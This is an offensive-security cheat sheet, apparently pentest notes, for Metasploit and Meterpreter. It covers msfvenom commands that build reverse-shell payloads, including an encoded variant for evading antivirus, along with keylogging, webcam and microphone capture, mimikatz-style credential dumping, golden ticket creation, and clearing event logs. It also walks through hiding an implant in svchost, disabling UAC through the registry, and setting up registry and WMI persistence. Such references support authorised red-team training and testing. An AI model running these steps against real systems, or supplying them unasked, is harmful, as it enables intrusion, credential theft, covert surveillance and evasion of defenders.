# Metasploit

### Port Scan

```
use auxiliary/scanner/portscan/
tcp
set RHOSTS 10.10.10.0/24
run
```

### DNS Enumeration

```
use auxiliary/gather/dns_enum
set DOMAIN target.tgt
run
```

### Host FTP Server

```
use auxiliary/server/ftp
set FTPROOT /tmp/ftproot
run
```

### Proxy Server

* Any proxied traffic that matches the subnet of a route will be routed through the session specified by route.&#x20;
* Use proxychains configured for socks4 to route any application's traffic through a Meterpreter session.

```
use auxiliary/server/socks4
run
```

## msfvenom

* The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode them.

### List Payloads&#x20;

```
msfvenom -l payloads
```

### Basic Examples

```
msfvenom -p windows/meterpreter/
reverse_tcp -f exe LHOST=10.1.1.1
LPORT=4444 > met.exe
```

### Format Options

```
--help-formats #List available output formats
exe #Executable 
pl #Perl
rb #Ruby
raw #Raw Shellcode
c #C Code
```

### Encoders&#x20;

* See all encoders&#x20;

```
msfvenom -l encoders
```

* Basic Example:

```
msfvenom -p windows/meterpreter/
reverse_tcp -i 5 -e x86/shikata_ga_nai -f
exe LHOST=10.1.1.1 LPORT=4444 > mal.exe
```

## Meterpreter

* Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used.
* Remember to check all available commands running the help command once a Meterpreter session has started.

### Post Exploitation Modules Reference

* https://www.offensive-security.com/metasploit-unleashed/post-module-reference/

### Core commands

* `background`: Backgrounds the current session
* `exit`: Terminate the Meterpreter session
* `guid`: Get the session GUID (Globally Unique Identifier)
* `help`: Displays the help menu
* `info`: Displays information about a Post module
* `irb`: Opens an interactive Ruby shell on the current session
* `load`: Loads one or more Meterpreter extensions
* `migrate`: Allows you to migrate Meterpreter to another process
* `run`: Executes a Meterpreter script or Post module
* `sessions`: Quickly switch to another session

### File system commands

* `cd`: Will change directory
* `ls`: Will list files in the current directory (dir will also work)
* `pwd`: Prints the current working directory
* `edit`: will allow you to edit a file
* `cat`: Will show the contents of a file to the screen
* `rm`: Will delete the specified file
* `search`: Will search for files
* `upload`: Will upload a file or directory
* `download`: Will download a file or directory

### Networking commands

* `arp`: Displays the host ARP (Address Resolution Protocol) cache
* `ifconfig`: Displays network interfaces available on the target system
* `netstat`: Displays the network connections
* `portfwd`: Forwards a local port to a remote service
* `route`: Allows you to view and modify the routing table

### System commands

* `clearev`: Clears the event logs
* `execute`: Executes a command
* `getpid`: Shows the current process identifier
* `getuid`: Shows the user that Meterpreter is running as
* `kill`: Terminates a process
* `pkill`: Terminates processes by name
* `ps`: Lists running processes
* `reboot`: Reboots the remote computer
* `shell`: Drops into a system command shell
* `shutdown`: Shuts down the remote computer
* `sysinfo`: Gets information about the remote system, such as OS

### Others Commands (these will be listed under different menu categories in the help menu)

* `idletime`: Returns the number of seconds the remote user has been idle
* `keyscan_dump`: Dumps the keystroke buffer
* `keyscan_start`: Starts capturing keystrokes
* `keyscan_stop`: Stops capturing keystrokes
* `screenshare`: Allows you to watch the remote user's desktop in real time
* `screenshot`: Grabs a screenshot of the interactive desktop
* `record_mic`: Records audio from the default microphone for X seconds
* `webcam_chat`: Starts a video chat
* `webcam_list`: Lists webcams
* `webcam_snap`: Takes a snapshot from the specified webcam
* `webcam_stream`: Plays a video stream from the specified webcam
* `getsystem`: Attempts to elevate your privilege to that of local system
* `hashdump`: Dumps the contents of the SAM database

### Modules

### Kiwi Commands

```
Command                Description
-------                -----------
creds_all              Retrieve all credentials (parsed)
creds_kerberos         Retrieve Kerberos creds (parsed)
creds_msv              Retrieve LM/NTLM creds (parsed)
creds_ssp              Retrieve SSP creds
creds_tspkg            Retrieve TsPkg creds (parsed)
creds_wdigest          Retrieve WDigest creds (parsed)
dcsync                 Retrieve user account information via DCSync (unparsed)
dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
golden_ticket_create   Create a golden kerberos ticket
kerberos_ticket_list   List all kerberos tickets (unparsed)
kerberos_ticket_purge  Purge any in-use kerberos tickets
kerberos_ticket_use    Use a kerberos ticket
kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
lsa_dump_sam           Dump LSA SAM (unparsed)
lsa_dump_secrets       Dump LSA secrets (unparsed)
password_change        Change the password/hash of a user
wifi_list              List wifi profiles/creds for the current user
wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```

* Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.

### New Meterpreter Session Steps

* Assuming you gained access, inserted AV Path Exception, wrote implant to disk and executed to catch you callback

```
getuid #see your user context
getpid #identify pid you are running as (should be the pid of your msfvenom implant named whatever you assigned)
getprivs #see enabled process privileges
ps #view the whole process list and pick and svchost process within the same user context, get its pid number
migrate XXXX #to the pid of the svchost process 
getpid #confirm new pid
ps #ensure it is of the correct process 
del /path/to/implant #remove implant artifact from disk 
```

* Now you are set up and running as a thread in the address space of the `svchost.exe` process

### File collect with meterpreter

* `download` and `upload` commands
* Ensure you are escaping the windows ""
* Example:

```
download C:\\Users\\Administrator\\Desktop\\secret.txt
```

### Post Modules for Windows Survey

```
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/checkvm 
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/credentials/credential_collector 
**ENSURE SYSTEM before running
-----------------------------------------------------------------------
**ENSURE you migrate to a user process before running dumplinks**
meterpreter > run post/windows/manage/migrate 
meterpreter > run post/windows/gather/dumplinks 
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/enum_applications 
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/enum_logged_on_users 
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/enum_shares 
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/enum_snmp
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/hashdump
**ENSURE SYSTEM before running 
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/usb_history 
-----------------------------------------------------------------------
msf > use post/multi/recon/local_exploit_suggester
set SESSION X
SHOWDESCRIPTION true
-----------------------------------------------------------------------
```

### Meterpreter Extensions

### **kiwi module**&#x20;

```
load kiwi
help kiwi
```

### Powershell Extension

```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > 
```

### **Metasploit imperssonate**

```
Load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
```

### **Upgrade shell to meterpreter**

```
use multi/manage/shell_to_meterpreter
set SESSION
set LHOST
set LPORT
run
```

### Routing

### **Set route**

```
route add <subnet / host ip> <subnetmask> <session id>
```

### **Autoroute module**

```
use multi/manage/autoroute
```

### **Run autoroute**

```
run autoroute -s 10.100.11.0/24
```

### **Create port forward**

```
Portfwd add -l <LOCAL PORT> -p <REMOTE PORT> -r <REMOTE HOST>
```

### Change UAC to not Notify

* Need to be admin

```
#check registry key first 
Get-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
#look for:
ConsentPromptBehaviorAdmin
ConsentPromptBehaviorUser
#Change if it is set to 1 or 2
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
```

### Disable LUA

* EnableLUA specifies whether Windows User Account Controls (UAC) notifies the user when programs try to make changes to the computer. UAC was formerly known as Limited User Account (LUA).

```
#check registry key first 
Get-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
#look for:
EnableLUA   1
#now set to 0 
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0
#will need to restart before changes are applied, thus ensure WMI Event Subscription Persistance or Registry is set up first
```

### Persistance Modules

* Registry Run Key

```
use exploit/windows/registry/local/registry_persistence
```

* Ensure to set the `RUN_NAME` at a minimum
* WMI Event Subscription Persistance

```
use exploit/windows/local/wmi_persistence
```

* Ensure failed login auditing is enabled on target
* To enable:

```
auditpol.exe /set /subcategory:Logon /failure:Enable
```

* Event ID for a failed logon is `4625`
* Ensure to set the `USERNAME_TRIGGER` and `SESSION` at a minimum
* Cannot be run as SYSTEM or USER needs to be run with ADMINISTRATOR
